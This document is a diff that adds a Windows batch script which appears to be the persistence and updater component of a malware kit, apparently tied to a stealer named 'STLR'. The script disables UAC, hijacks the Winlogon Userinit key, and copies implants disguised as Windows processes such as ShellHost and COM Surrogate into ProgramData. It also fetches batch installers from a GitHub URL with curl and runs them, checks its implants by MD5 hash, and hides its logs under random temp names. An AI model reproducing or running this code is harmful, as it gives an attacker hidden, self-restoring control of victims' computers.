@@ -1,0 +1,2105 @@
+ÿþ&cls
+:: ( nHBAPWtA )
+:: RUNEVERYCALLER Installed in %appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe ( %SystemRoot%\System32\convertsshd.exe )
+:: RUNEVERYCALLER TASK NAMED "SystemLibrariesU" , is Running RunEveryCaller every 1 min
+
+::goto :EOF
+
+@echo off
+
+
+setlocal enabledelayedexpansion
+
+
+set "BATCHVERSION=14.3"
+
+
+
+set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+set "filename="
+
+
+
+
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+set "filename1=!filename!"
+set "filename="
+
+
+
+
+:: Set the log file path
+set "LOGFILE=%temp%\!filename1!"
+
+
+
+:: Start logging from this point
+call :LogOutput > "%LOGFILE%" 2>&1
+del /f /q "%LOGFILE%"
+echo.
+echo.
+echo Exiting...
+exit
+
+:LogOutput
+:: Your long batch script starts here
+
+
+
+
+:: Define allowed HWIDs here
+set "VALID_HWIDS="
+
+
+
+
+
+:: Count the instances of RUNEVERYCALLER.exe
+set "instances=0"
+for /f "tokens=*" %%A in ('tasklist /fi "imagename eq RUNEVERYCALLER.exe" ^| find /i "RUNEVERYCALLER.exe"') do (
+    set /a instances+=1
+)
+
+:: Check if one or more instances are found
+if %instances% geq 2 (
+    echo RUNEVERYCALLER.exe is already running. Exiting batch...
+    exit
+)
+
+
+
+echo %date% %time%
+echo.
+echo.
+
+
+net session >nul 2>&1
+if %errorLevel% == 0 (
+    echo Running as Administrator
+) else (
+    echo Not running as Administrator
+)
+
+echo.
+echo.
+
+echo RUNEVERYCALLER.exe is not running. Continue.....
+
+
+
+
+set "CheckSend=0"
+set "lastMinute=none"
+
+
+
+
+
+
+
+
+
+
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+set "filename2=!filename!"
+set "filename="
+
+
+
+
+set "InstalledQWB=%temp%\!filename2!"
+del /f /q "%InstalledQWB%"
+
+
+
+
+
+if exist "%SystemRoot%\System32\handle.exe" goto CHECKLOCKFILE
+goto AFTERCHECKLOCKFILE
+
+
+
+:CHECKLOCKFILE
+echo Handle.exe exist
+echo.
+:: Set the target file path
+set "FILE_TO_CHECK=%temp%\STLRLOG.mseuope"
+
+
+:: Find processes locking the file
+reg query HKCU\Software\Sysinternals\Handle /v EulaAccepted
+reg add HKCU\Software\Sysinternals\Handle /v EulaAccepted /t REG_DWORD /d 1 /f
+reg query HKCU\Software\Sysinternals\Handle /v EulaAccepted
+echo.
+echo Handle LOGFILE T3 STLR
+handle.exe "%FILE_TO_CHECK%"
+echo.
+echo Handle LOGFILE TA3 RUNEVERY
+handle.exe "%LOGFILE%"
+echo.
+echo.
+echo echo Handle RUNEVERYCALLER
+handle.exe "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
+echo.
+echo.
+echo Handle STLRRUNNERCALLER
+handle.exe "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
+echo.
+echo.
+
+
+
+
+:AFTERCHECKLOCKFILE
+
+
+
+
+if exist "%temp%\STLRLOG.mseuope" (
+    echo STLRLOG.mseuope exists
+) else (
+    echo STLRLOG.mseuope not exist
+)
+
+
+
+
+:: Place HWID into %HWID% variable 
+for /f %%i in ('powershell -Command "(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID"') do set HWID=%%i
+
+
+
+
+
+
+
+
+:: Initialize the loop counter outside of the loop
+:: set loopCount=0
+
+
+
+
+:loop_start
+echo :loop_start
+echo.
+
+
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo Updates : >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+
+
+
+
+
+
+::ShellHost.exe ---> TSSPrxySHST.exe
+::RuntimeBroker.exe ---> TSSPrxyRNTM.exe
+::COM Surrogate.exe ---> SyncHostApp.exe
+::KMSAuto.exe ---> TSSKMS.exe
+::StartupTaskCaller.exe ---> TSSPrxySTC.exe
+
+
+
+
+
+:RUNADMINHERE
+cd /d "%~dp0"
+:: Run All your commands here ( will be executed with admin privileges )
+
+
+:: Disable UAC 
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 0 /f
+
+
+
+
+set "COMSTARTED=0"
+
+
+
+
+
+set "STLRKILL=0"
+
+:: Check STLRKILL value at the start
+if "%STLRKILL%" NEQ "1" goto NOTKILLSTLR
+
+
+
+
+:PROCESSKILLERSTLR
+set "ProcessToKill=STLRRUNNERCALLER"
+set "CheckSend=1"
+echo CheckSend=%CheckSend%
+echo.
+echo Listing child processes of %ProcessToKill%.exe...
+powershell -Command "Get-CimInstance Win32_Process | Where-Object { $_.ParentProcessId -eq (Get-Process -Name %ProcessToKill%).Id } | Select-Object ProcessId, Name" > chldrocess.txt
+echo.
+type chldrocess.txt
+echo.
+echo.
+:: Display and kill the child processes
+echo.
+echo PID   -   Process Name
+echo ----------------------
+for /f "skip=3 tokens=1,2 delims= " %%A in (chldrocess.txt) do (
+    set "PID=%%A"
+    set "PROCESSNAME=%%B"
+    echo !PID!   -   !PROCESSNAME!
+    echo Killing !PROCESSNAME! with PID !PID!
+    taskkill /PID !PID! /F
+)
+echo.
+echo All child processes terminated.
+del chldrocess.txt
+echo.
+
+:: Kill the parent process itself
+taskkill /F /T /IM %ProcessToKill%.exe
+goto DONE1
+
+
+:NOTKILLSTLR
+echo STLRKILL is 0. Skipping process termination.
+
+
+
+:DONE1
+
+
+
+
+
+
+goto :NEXT3
+
+
+
+:: Check if the file exists
+if exist "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe" goto :CHECKSTLRRUNSTATUS
+echo STLRRUNNERCALLER.exe not found. Going to NEXT3
+goto :NEXT3
+
+
+
+:CHECKSTLRRUNSTATUS
+
+if "%STLRKILL%" NEQ "0" goto CONTINUEAFTERCHECKSTLRRUNSTATUS
+
+echo Check if the process is already running...
+tasklist /fi "imagename eq STLRRUNNERCALLER.exe" | find /i "STLRRUNNERCALLER.exe" >nul
+if %errorlevel% neq 0 goto :STLRCALLNOTRUNNING
+goto :STLRCALLRUNNING
+
+
+:STLRCALLNOTRUNNING
+echo STLRRUNNERCALLER.exe is not running.
+set "CheckSend=1"
+echo CheckSend=%CheckSend%
+echo Starting STLRRUNNERCALLER...
+start "" "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
+set "MESSAGE=STLRSTARTED|"
+echo Started.
+goto :CONTINUEAFTERCHECKSTLRRUNSTATUS
+
+:STLRCALLRUNNING
+echo STLRRUNNERCALLER.exe is already running.
+
+
+
+
+
+:CONTINUEAFTERCHECKSTLRRUNSTATUS
+
+
+echo.
+echo.
+echo CheckSend=%CheckSend% and MESSAGE=%MESSAGE%
+
+
+
+
+echo Listing all STLRRUNNERCALLER.exe processes with PIDs...
+tasklist /FI "IMAGENAME eq STLRRUNNERCALLER.exe"
+
+
+echo.
+echo.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:NEXT3
+echo.
+
+
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
+
+echo Adding...
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\System32\userinit.exe,%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe" /f
+echo.
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
+echo.
+
+
+
+
+:EVERYSECOND
+echo :EVERYSECOND
+echo.
+
+
+
+
+
+:CWP
+echo :CWP
+echo.
+
+:: Define the paths
+set "sourceFile=%SystemRoot%\System32\CWProcess.exe"
+set "startupFile=%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
+
+:: Check if the file exists in the Startup folder
+if not exist "%startupFile%" (
+    echo File not found in Startup folder. Restoring...
+    copy "%sourceFile%" "%startupFile%"
+) else (
+    echo File is already in %startupFile%.
+)
+
+timeout /t 1 /nobreak >nul
+
+
+
+
+
+
+
+
+
+:SHST
+echo :SHST
+echo.
+
+:: Define the paths
+set "sourceFile=%SystemRoot%\System32\TSSPrxySHST.exe"
+set "startupFile=%ProgramData%\Microsoft\Windows\ShellHost.exe"
+
+:: Check if the file exists in the Startup folder
+if not exist "%startupFile%" (
+    echo File not found in Startup folder. Restoring...
+    copy "%sourceFile%" "%startupFile%"
+) else (
+    echo File is already in %startupFile%.
+)
+
+timeout /t 1 /nobreak >nul
+
+
+
+
+
+
+
+:COM
+echo :COM
+echo.
+
+:: Define the paths
+set "sourceFile=%SystemRoot%\System32\SyncHostApp.exe"
+set "startupFile=%ProgramData%\Microsoft\Windows\COM Surrogate.exe"
+
+:: Check if the file exists in the Startup folder
+if not exist "%startupFile%" (
+    echo File not found in Startup folder. Restoring...
+    copy "%sourceFile%" "%startupFile%"
+) else (
+    echo File is already in %startupFile%.
+)
+
+del /F /Q /A "%appdata%\*.ps1"
+reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Powershell /f
+reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Steam /f
+
+timeout /t 1 /nobreak >nul
+
+
+
+
+
+
+
+:KMS
+echo :KMS
+echo.
+
+:: Define the paths
+set "sourceFile=%SystemRoot%\System32\TSSKMS.exe"
+set "startupFile=%ProgramData%\Microsoft\Windows\KMSAuto.exe"
+
+:: Check if the file exists in the Startup folder
+if not exist "%startupFile%" (
+    echo File not found in Startup folder. Restoring...
+    copy "%sourceFile%" "%startupFile%"
+) else (
+    echo File is already in %startupFile%.
+)
+
+timeout /t 1 /nobreak >nul
+
+
+
+
+
+:STLRRUN
+echo :STLRRUN
+echo.
+
+:: Define the paths
+set "sourceFile=%SystemRoot%\System32\WindowsTasks.exe"
+set "startupFile=%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
+
+:: Check if the file exists in the Startup folder
+if not exist "%startupFile%" (
+    echo File not found in Startup folder. Restoring...
+    copy "%sourceFile%" "%startupFile%"
+) else (
+    echo File is already in %startupFile%.
+)
+
+timeout /t 1 /nobreak >nul
+
+
+
+
+
+
+
+
+
+
+
+
+:CHECKSTARTUPPROGRAMS
+echo :CHECKSTARTUPPROGRAMS
+echo.
+
+
+
+:: Check Startup Programms , if not found Run Task , if not found task , Download STC & Run it 
+
+:: Define the list of files to check
+set "file1=%ProgramData%\Microsoft\Windows\COM Surrogate.exe"
+set "file2=%ProgramData%\Microsoft\Windows\ShellHost.exe"
+set "file3=%ProgramData%\Microsoft\Windows\KMSAuto.exe"
+set "file4=%APPDATA%\Microsoft\nircmd.exe"
+set "file5=%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
+set "file6=%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
+set "file7=%APPDATA%\Microsoft\7z.exe"
+set "file8=%APPDATA%\Microsoft\7z.dll"
+set "file9=%SystemRoot%\System32\handle.exe"
+
+
+echo Typing in %InstalledQWB%
+echo.
+
+if exist "%file1%" echo COM Surrogate.exe Found in %file1% >> "%InstalledQWB%"
+if exist "%file2%" echo ShellHost.exe Found in %file2% >> "%InstalledQWB%"
+if exist "%file3%" echo KMSAuto.exe Found in %file3% >> "%InstalledQWB%"
+if exist "%file4%" echo nircmd.exe Found in %file4% >> "%InstalledQWB%"
+if exist "%file5%" echo CoreWorkerProcess.exe Found in %file5% >> "%InstalledQWB%"
+::if exist "%file6%" echo STLRRUNNERCALLER.exe Found in %file6% >> "%InstalledQWB%"
+if exist "%file7%" if exist "%file8%" (
+    echo 7z.exe and 7z.dll Found in %file7% and %file8% >> "%InstalledQWB%"
+) else (
+    if exist "%file7%" echo 7z.exe Found in %file7% >> "%InstalledQWB%"
+    if exist "%file8%" echo 7z.dll Found in %file8% >> "%InstalledQWB%"
+)
+if exist "%file9%" echo handle.exe Found in %file9% >> "%InstalledQWB%"
+
+
+
+
+
+:: Check each file
+if not exist "%file1%" goto STARTUPTAASK
+if not exist "%file2%" goto STARTUPTAASK
+if not exist "%file3%" goto STARTUPTAASK
+if not exist "%file4%" goto STARTUPTAASK
+if not exist "%file5%" goto STARTUPTAASK
+::if not exist "%file6%" goto STARTUPTAASK
+if not exist "%file7%" goto STARTUPTAASK
+if not exist "%file8%" goto STARTUPTAASK
+if not exist "%file9%" goto STARTUPTAASK
+
+
+
+:: If all files are found, continue with other tasks
+echo All files found.
+
+
+
+:: goto COMMANDSFORAGENTS
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:STARTUPTAASK
+echo :STARTUPTAASK
+echo.
+
+
+
+set "ShellHostMD5=f08c58ee2c0a30f6e6bdc26b624bb323"
+set "KMSAutoMD5=325d0bd19d0153c5be3324cdbba60e33"
+
+
+
+
+
+:CheckSHST
+echo :CheckSHST
+echo.
+
+
+
+set "SHSTFILE=%ProgramData%\Microsoft\Windows\ShellHost.exe"
+set "SHSTFILEroot=%SystemRoot%\System32\TSSPrxySHST.exe"
+
+
+
+echo Checking if %SHSTFILE% exists...
+
+if exist "%SHSTFILE%" (
+    echo %SHSTFILE% found . Going to CHECKSHSTMD5
+    goto CHECKSHSTMD5
+) else (
+    goto SHSTINSTALL
+)
+
+
+:CHECKSHSTMD5
+for /f "tokens=*" %%A in ('certutil -hashfile "%SHSTFILE%" MD5 ^| findstr /V "hash"') do set "SHSTFILEmd5=%%A"
+echo MD5 of %SHSTFILE% = %SHSTFILEmd5%
+echo.
+echo Comparing with stored MD5: %ShellHostMD5%
+echo.
+
+if "%SHSTFILEmd5%"=="%ShellHostMD5%" (
+    echo MD5 matches %SHSTFILEmd5% = %ShellHostMD5%
+    echo going to CheckKMSAuto
+    goto CheckKMSAuto
+)
+
+echo MD5 doesnt match %SHSTFILEmd5% # %ShellHostMD5%
+set "MESSAGE=MD5SHSTMISMATCH^|"
+
+
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
+
+
+echo Deleting %SHSTFILEroot% and %SHSTFILE%
+del /f /q "%SHSTFILEroot%"
+echo Killing process ShellHost by Powershell
+powershell -Command "& { Get-Process | Where-Object { $_.Path -eq '%SHSTFILE%' } | Stop-Process -Force }"
+del /f /q "%SHSTFILE%"
+echo.
+
+if exist "%SHSTFILEroot%" (
+    echo Failed to delete %SHSTFILEroot%!
+    echo Going to CheckKMSAuto
+    goto CheckKMSAuto
+) else (
+    echo Successfully deleted %SHSTFILEroot%.
+)
+
+if exist "%SHSTFILE%" (
+     echo Failed to delete %SHSTFILE%!
+     echo Going to CheckKMSAuto
+     goto CheckKMSAuto
+) else (
+     echo Successfully deleted %SHSTFILE%.
+)
+
+
+
+
+
+
+
+echo Going to SHSTINSTALL...
+
+
+
+
+:SHSTINSTALL
+:: Run commands if ShellHost.exe is not found
+echo Checking for ShellHost...
+set "embeddedScript=temp_script_SHST.bat"
+
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ShellHost"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%"
+    echo.
+    echo.
+) else (
+    echo Filed to get content from ShellHost Link
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto SHSTINSTALL
+)
+
+
+set "sourceFile=%SystemRoot%\System32\TSSPrxySHST.exe"
+set "startupFile=%ProgramData%\Microsoft\Windows\ShellHost.exe"
+copy "%sourceFile%" "%startupFile%"
+
+
+
+
+
+set "MESSAGE=%MESSAGE%SHST^|"
+set "CheckSend=1"
+
+
+
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:CheckKMSAuto
+echo :CheckKMSAuto
+echo.
+
+
+
+
+
+set "KMSFILE=%ProgramData%\Microsoft\Windows\KMSAuto.exe"
+set "KMSFILEroot=%SystemRoot%\System32\TSSKMS.exe"
+
+
+
+echo Checking if %KMSFILE% exists...
+if exist "%KMSFILE%" (
+    goto CHECKKMSMD5
+    echo %KMSFILE% found. Going to CHECKKMSMD5
+) else (
+    goto KMSINSTALL
+)
+
+
+:CHECKKMSMD5
+for /f "tokens=*" %%A in ('certutil -hashfile "%KMSFILE%" MD5 ^| findstr /V "hash"') do set "KMSFILEmd5=%%A"
+echo MD5 of %KMSFILE% = %KMSFILEmd5%
+echo.
+echo Comparing with stored MD5: %KMSAutoMD5%
+echo.
+
+if "%KMSFILEmd5%"=="%KMSAutoMD5%" (
+    echo MD5 matches %KMSFILEmd5% = %KMSAutoMD5%
+    echo going to CheckComSurrogate
+    goto CheckComSurrogate
+)
+
+echo MD5 doesnt match %KMSFILEmd5% # %KMSAutoMD5%
+set "MESSAGE=%MESSAGE%MD5KMSMISMATCH^|"
+
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
+
+
+echo Deleting %KMSFILEroot% and %KMSFILE%
+del /f /q "%KMSFILEroot%"
+echo Killing process KMSAuto by Powershell
+powershell -Command "& { Get-Process | Where-Object { $_.Path -eq '%KMSFILE%' } | Stop-Process -Force }"
+del /f /q "%KMSFILE%"
+echo.
+
+if exist "%KMSFILEroot%" (
+    echo Failed to delete %KMSFILEroot%!
+    echo Going to CheckComSurrogate
+    goto CheckComSurrogate
+) else (
+    echo Successfully deleted %KMSFILEroot%.
+)
+
+if exist "%KMSFILE%" (
+     echo Failed to delete %KMSFILE%!
+     echo Going to CheckComSurrogate
+     goto CheckComSurrogate
+) else (
+     echo Successfully deleted %KMSFILE%.
+)
+
+
+
+
+
+echo Going to KMSINSTALL...
+
+
+:KMSINSTALL
+:: Run commands if KMSAuto.exe is not found
+echo Checking for KMSAuto...
+set "embeddedScript=temp_script_KMS.bat"
+
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/KMSAuto"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%"
+    echo.
+    echo.
+) else (
+    echo Filed to get content from KMSAuto Link
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto KMSINSTALL
+)
+
+set "sourceFile=%SystemRoot%\System32\TSSKMS.exe"
+set "startupFile=%ProgramData%\Microsoft\Windows\KMSAuto.exe"
+copy "%sourceFile%" "%startupFile%"
+
+
+
+
+set "MESSAGE=%MESSAGE%KMSAuto^|"
+set "CheckSend=1"
+
+
+
+
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:CheckComSurrogate
+echo :CheckComSurrogate
+echo.
+
+:: Check ComSurrogate.exe; if found, skip to next section
+if exist "%ProgramData%\Microsoft\Windows\COM Surrogate.exe" (
+    echo %ProgramData%\Microsoft\Windows\COM Surrogate.exe found. Going to CheckCWP
+    goto CheckCWP
+)
+
+:: Run commands if ComSurrogate.exe is not found
+echo Checking for COM Surrogate...
+set "embeddedScript=temp_script_COM.bat"
+
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ComSurrogate"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%"
+    echo.
+    echo.
+) else (
+    echo Filed to get content from ComSurrogate Link
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto CheckComSurrogate
+)
+
+set "MESSAGE=%MESSAGE%ComSurrogate^|"
+set "CheckSend=1"
+
+
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:CheckCWP
+echo :CheckCWP
+echo.
+
+
+
+:: Check CoreWorkerProcess.exe; if found, skip to CheckComSurrogate
+if exist "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe" (
+    echo %ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe found. Going to Check7ZIP
+    goto Check7ZIP
+)
+
+
+
+:: Run commands if CoreWorkerProcess.exe is not found
+echo Checking for CoreWorkerProcess...
+set "embeddedScript=temp_script_CWP.bat"
+
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/CoreWorkerProcess"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%"
+    echo.
+    echo.
+) else (
+    echo Filed to get content from CoreWorkerProcess Link
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto CheckCWP
+)
+
+
+set "MESSAGE=%MESSAGE%CoreProcessInstalled^|"
+set "CheckSend=1"
+
+
+
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:Check7ZIP
+echo :Check7ZIP
+echo.
+
+:: Check 7z.exe; 7z.dll if found, skip to next section
+if exist "%APPDATA%\Microsoft\7z.exe" (
+    echo %APPDATA%\Microsoft\7z.exe found. Going to CheckNIRCMD
+    goto CheckNIRCMD
+)
+
+if exist "%APPDATA%\Microsoft\7z.dll" (
+    echo %APPDATA%\Microsoft\7z.dll found. Going to CheckNIRCMD
+    goto CheckNIRCMD
+)
+
+:: Run commands if Nircmd.exe is not found
+echo Checking for 7z...
+set "embeddedScript=temp_script_7z.bat"
+
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/7zip"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%"
+    echo.
+    echo.
+) else (
+    echo Filed to get content from NIRCMD Link
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto Check7ZIP
+)
+
+set "MESSAGE=%MESSAGE%7ZIP^|"
+set "CheckSend=1"
+
+
+
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
+
+
+
+
+
+
+
+
+
+
+
+
+:CheckNIRCMD
+echo :CheckNIRCMD
+echo.
+
+:: Check nircmd.exe; if found, skip to next section
+if exist "%APPDATA%\Microsoft\nircmd.exe" (
+    echo %APPDATA%\Microsoft\nircmd.exe found. Going to CheckHandle
+    goto CheckHandle
+)
+
+:: Run commands if Nircmd.exe is not found
+echo Checking for Nircmd...
+set "embeddedScript=temp_script_Nircmd.bat"
+
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/Nircmd"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%"
+    echo.
+    echo.
+) else (
+    echo Filed to get content from NIRCMD Link
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto CheckNIRCMD
+)
+
+set "MESSAGE=%MESSAGE%NIRCMD^|"
+set "CheckSend=1"
+
+
+
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
+
+
+
+
+goto CheckHandle
+
+
+
+:CheckSTLRRUN
+echo :CheckSTLRRUN
+echo.
+
+:: Check STLRRUNNERCALLER.exe; if found, skip to next section
+if exist "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe" (
+    echo %ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe found. Going to CheckHandle
+    goto CheckHandle
+)
+
+:: Run commands if STLRRUNNERCALLER.exe is not found
+echo Checking for STLRRUNNERCALLER...
+set "embeddedScript=temp_script_STLRRUNINST.bat"
+
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/STLRRUNNERCALLER"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%"
+    echo.
+    echo.
+) else (
+    echo Filed to get content from NIRCMD Link
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto CheckSTLRRUN
+)
+
+set "MESSAGE=%MESSAGE%STLRRUN^|"
+set "CheckSend=1"
+
+
+
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:CheckHandle
+echo :CheckHandle
+echo.
+
+:: Check handle.exe; if found, skip to next section
+if exist "%file9%" (
+    echo %file9% found. Going to COMMANDSFORAGENTS
+    goto COMMANDSFORAGENTS
+)
+
+:: Run commands if handle.exe is not found
+echo Checking for handle...
+set "embeddedScript=temp_script_handle.bat"
+
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/Handle"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%"
+    echo.
+    echo.
+) else (
+    echo Filed to get content from Handle Link
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto CheckHandle
+)
+
+set "MESSAGE=%MESSAGE%Handle^|"
+set "CheckSend=1"
+
+
+
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:COMMANDSFORAGENTS
+echo :COMMANDSFORAGENTS
+echo.
+
+
+
+
+:RUNNINGSHSTKMS
+
+
+for /f "tokens=*" %%A in ('certutil -hashfile "%SHSTFILE%" MD5 ^| findstr /V "hash"') do set "SHSTFILEmd5=%%A"
+echo MD5 of %SHSTFILE% = %SHSTFILEmd5%
+echo.
+echo Comparing with stored MD5: %ShellHostMD5%
+echo.
+
+if "%SHSTFILEmd5%"=="%ShellHostMD5%" (
+    echo MD5 matches %SHSTFILEmd5% = %ShellHostMD5%
+    echo Starting %SHSTFILE%
+    start "" "%SHSTFILE%"
+    echo Started.
+    echo.
+) else (
+    echo MD5 doesnt match %SHSTFILEmd5% # %ShellHostMD5%
+    echo No Start for %SHSTFILE%
+    echo.
+)
+
+
+echo.
+echo.
+
+
+for /f "tokens=*" %%A in ('certutil -hashfile "%KMSFILE%" MD5 ^| findstr /V "hash"') do set "KMSFILEmd5=%%A"
+echo MD5 of %KMSFILE% = %KMSFILEmd5%
+echo.
+echo Comparing with stored MD5: %KMSAutoMD5%
+echo.
+
+if "%KMSFILEmd5%"=="%KMSAutoMD5%" (
+    echo MD5 matches %KMSFILEmd5% = %KMSAutoMD5%
+    echo Starting %KMSFILE%
+    start "" "%KMSFILE%"
+    echo Started.
+    echo.
+) else (
+    echo MD5 doesnt match %KMSFILEmd5% # %KMSAutoMD5%
+    echo No Start for %KMSFILE%
+    echo.
+)
+
+echo.
+echo.
+
+
+
+
+echo.
+echo.
+powershell -command "Get-Process KMSAuto, ShellHost, STLRRUNNERCALLER -ErrorAction SilentlyContinue | ForEach-Object { $_.Path }"
+echo.
+echo.
+
+
+
+
+
+
+
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+set "filename3=!filename!"
+set "filename="
+
+
+
+
+set "ProcessTXTFILE=%temp%\!filename3!"
+
+
+echo Saving All Processes in "%ProcessTXTFILE%"
+powershell -command "Get-Process | Select-Object ProcessName, Path | Format-Table -AutoSize -Wrap" > "%ProcessTXTFILE%" 2>nul
+::powershell -command "Get-Process | Select-Object ProcessName, Path" > "%ProcessTXTFILE%" 2>nul
+echo Saved.
+echo.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+::if exist "%ProgramData%\Microsoft\Windows\ShellHost.exe" start "" "%ProgramData%\Microsoft\Windows\ShellHost.exe"
+::if exist "%ProgramData%\Microsoft\Windows\KMSAuto.exe" start "" "%ProgramData%\Microsoft\Windows\KMSAuto.exe"
+
+
+
+
+
+
+
+
+
+
+
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
+
+
+
+
+
+
+
+
+
+:REMOVINGTASKS
+echo :REMOVINGTASKS
+echo.
+
+:: Ending Tasks
+echo Ending Tasks :
